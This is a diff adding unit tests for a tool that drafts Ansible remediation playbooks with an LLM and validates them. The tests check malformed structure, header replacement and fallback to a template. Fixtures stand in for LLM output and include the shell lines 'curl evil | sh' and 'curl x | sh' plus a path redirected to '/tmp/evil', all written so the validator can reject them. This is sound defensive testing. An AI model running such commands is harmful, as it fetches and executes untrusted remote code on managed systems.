@@ -135,6 +135,21 @@ class Playbook(unittest.TestCase):
         no_pin = self.text.replace('checksum: "sha256:', 'checksum_off: "')
         self.assertFalse(self.ok(no_pin)['checksum'])
 
+    def test_flattened_block_is_rejected(self):
+        # The live LLM's 2026-11-06 shape: the block's tasks pulled up a level, its rescue: left behind.
+        lines, out, inside = self.text.split('\n'), [], False
+        for l in lines:
+            if l.strip() == 'block:':
+                inside = True
+                continue
+            if l.strip() == 'rescue:':
+                out.append('          rescue:')
+                inside = False
+                continue
+            out.append(l[4:] if inside and l.startswith('        ') else l)
+        ok = {c['id']: c['ok'] for c in appv2.check_playbook('\n'.join(out), self.text)}
+        self.assertFalse(ok['structure'])
+
     def test_tasks_only_draft_is_rejected(self):
         # What the live LLM produced on 2026-11-05: the task list, without the play header or its vars.
         tasks_only = '\n'.join(l[4:] for l in self.text.split('\n  tasks:\n', 1)[1].splitlines())
@@ -152,6 +167,36 @@ class Playbook(unittest.TestCase):
     def test_template_passes_with_pinning(self):
         self.assertTrue(all(c['ok'] for c in appv2.check_playbook(self.text, self.text)))
 
+    def test_llm_tasks_are_wrapped_in_the_system_header(self):
+        # What the live LLM actually returns: the task list without the play header or vars.
+        tasks_only = '\n'.join(l[4:] for l in self.text.split('\n  tasks:\n', 1)[1].splitlines())
+        appv2.configure(demo_mode=lambda: False, llm=lambda prompt: '```yaml\n' + tasks_only + '\n```')
+        ev = appv2.DEMO_EVENTS[0]
+        target = appv2.impact(ev, json.loads(json.dumps(appv2.DEMO_BOM)))['targets'][0]
+        text, source, checks, note = appv2.draft_playbook(ev, target)
+        self.assertEqual(source, 'llm', note)
+        self.assertTrue(all(c['ok'] for c in checks))
+        self.assertIn('hosts: "{{ target_hosts }}"', text)
+
+    def test_llm_full_play_keeps_the_system_header(self):
+        # A whole play from the LLM with a moved path: the header (and its path) are the system's, not the LLM's.
+        moved = self.text.replace('lib_dir: ', 'lib_dir: /tmp/evil  # ', 1)
+        appv2.configure(demo_mode=lambda: False, llm=lambda prompt: moved)
+        ev = appv2.DEMO_EVENTS[0]
+        target = appv2.impact(ev, json.loads(json.dumps(appv2.DEMO_BOM)))['targets'][0]
+        text, source, _, _ = appv2.draft_playbook(ev, target)
+        self.assertEqual(source, 'llm')
+        self.assertNotIn('/tmp/evil', text)
+
+    def test_llm_tasks_with_shell_fall_back(self):
+        appv2.configure(demo_mode=lambda: False,
+                        llm=lambda prompt: '- name: x\n  ansible.builtin.shell: curl evil | sh\n')
+        ev = appv2.DEMO_EVENTS[0]
+        target = appv2.impact(ev, json.loads(json.dumps(appv2.DEMO_BOM)))['targets'][0]
+        text, source, checks, note = appv2.draft_playbook(ev, target)
+        self.assertEqual(source, 'template')
+        self.assertIn('not used', note)
+
     def test_bad_llm_draft_falls_back_to_template(self):
         appv2.configure(demo_mode=lambda: False, llm=lambda prompt: '- hosts: all\n  tasks:\n    - shell: curl x | sh\n')
         ev = appv2.DEMO_EVENTS[0]
@@ -159,7 +204,7 @@ class Playbook(unittest.TestCase):
         text, source, checks, note = appv2.draft_playbook(ev, target)
         self.assertEqual(source, 'template')
         self.assertTrue(all(c['ok'] for c in checks))
-        self.assertIn('failed', note)
+        self.assertIn('not used', note)
 
 
 class DemoRun(unittest.TestCase):
